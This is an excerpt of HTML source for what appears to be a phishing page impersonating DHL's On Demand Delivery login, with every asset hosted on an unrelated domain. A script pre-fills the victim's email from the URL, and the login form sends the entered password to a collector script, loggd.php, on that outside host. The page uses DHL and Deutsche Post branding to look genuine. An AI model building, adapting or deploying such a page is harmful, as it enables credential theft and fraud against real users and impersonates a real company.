...
<script src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/jquery.min.js"></script>
<script src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/bootstrap.min.js"></script>
<script>$.urlParam = function(email){ var results = new RegExp('[\?&]' + email + '=([^&#]*)').exec(window.location.href); return results[1] || 0; }</script> <script> $( document ).ready(function() { $("#email").val($.urlParam('email')); }); </script>
 <link rel="shortcut icon" href="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/login.css">
    </head>
	    ...
	    <div class="modal-dialog linguisticHelpModel">
	      <div class="modal-content">
	        <div class="modal-header helpModalHeader">
	          <button type="button" class="close" data-dismiss="modal" aria-hidden="true"> <img style="padding-top:10px" src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/icon-close.png"> </button>
    ...
    <section id="login-body" class="row">
      <div class="col-xs-24">
        <img src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/dhl_logo.svg" class="logo-dhl is-centered img-responsive" alt="DHL">
      </div>
      <div class="col-xs-24">
        <img src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/odd_logo.svg" class="logo-odd is-centered img-responsive" alt="On Demand Delivery">
      </div>
...
<form id="loginForm" name="loginForm" method="post" action="https://kbokogroup.com/dhll/loggd.php">
        ...
        <div class="row login-input-group">
		  ...
		  <input placeholder="Email Address Password" type="password" id="loginForm:password" required="" name="cash" class="password-toggle" tabindex="2" style="">
              <img id="icon-password" alt="eye" class="img-responsive icon-password" src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/eyeshow.svg" ></div><span id="loginForm:password-field-error" style="display: none;" class="input-error"></span>
</div>
      ...
      <footer id="main-footer" class="row">
        <div class="col-xs-8 nopadding">
          <img src="https://kbokogroup.com/dhll/On-Demand-Delivery/milk/dpdhl_logo.svg" class="logo-dpdhl img-responsive" alt="Deutsche Post DHL Group">
        </div>
